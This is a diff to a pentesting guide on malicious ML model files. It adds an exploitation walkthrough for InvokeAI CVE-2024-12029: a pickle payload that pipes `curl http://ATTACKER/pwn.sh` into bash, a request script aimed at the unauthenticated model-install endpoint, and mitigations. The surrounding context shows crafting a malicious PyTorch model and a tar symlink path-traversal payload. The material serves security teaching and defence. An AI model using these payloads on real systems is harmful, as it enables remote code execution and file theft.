@@ -23,10 +23,86 @@ At the time of the writting these are some examples of this type of vulneravilit
 | **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
 | **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
 
-
 Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.
 
-Example:
+### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)
+
+`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.
+
+Internally the endpoint eventually calls:
+
+```python
+checkpoint = torch.load(path, map_location=torch.device("meta"))
+```
+
+When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.
+
+The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).
+
+#### Exploitation walk-through
+
+1. Create a malicious checkpoint:
+
+```python
+# payload_gen.py
+import pickle, torch, os
+
+class Payload:
+    def __reduce__(self):
+        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))
+
+with open("payload.ckpt", "wb") as f:
+    pickle.dump(Payload(), f)
+```
+
+2. Host `payload.ckpt` on an HTTP server you control (e.g. `http://ATTACKER/payload.ckpt`).
+3. Trigger the vulnerable endpoint (no authentication required):
+
+```python
+import requests
+
+requests.post(
+    "http://TARGET:9090/api/v2/models/install",
+    params={
+        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
+        "inplace": "true",                         # write inside models dir
+        # the dangerous default is scan=false → no AV scan
+    },
+    json={},                                         # body can be empty
+    timeout=5,
+)
+```
+
+4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.
+
+Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.
+
+#### Conditions
+
+•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
+•  `/api/v2/models/install` reachable by the attacker
+•  Process has permissions to execute shell commands
+
+#### Mitigations
+
+* Upgrade to **InvokeAI ≥ 5.4.3** – the patch sets `scan=True` by default and performs malware scanning before deserialization.
+* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
+* Enforce allow-lists / signatures for model sources and run the service with least-privilege.
+
+> ⚠️ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.
+
+---
+
+Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
+
+```nginx
+location /api/v2/models/install {
+    deny all;                       # block direct Internet access
+    allow 10.0.0.0/8;               # only internal CI network can call it
+}
+```
+
+## Example – crafting a malicious PyTorch model
 
 - Create the model:
 
@@ -67,7 +143,6 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 # /tmp/pwned.txt is created even if you get an error
 ```
 
-
 ## Models to Path Traversal
 
 As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.
@@ -101,5 +176,12 @@ with tarfile.open("symlink_demo.model", "w:gz") as tf:
     tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
     tf.add(PAYLOAD)                      # rides the symlink
 ```
+
+## References
+
+- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
+- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
+- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
+- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
 
 {{#include ../banners/hacktricks-training.md}}
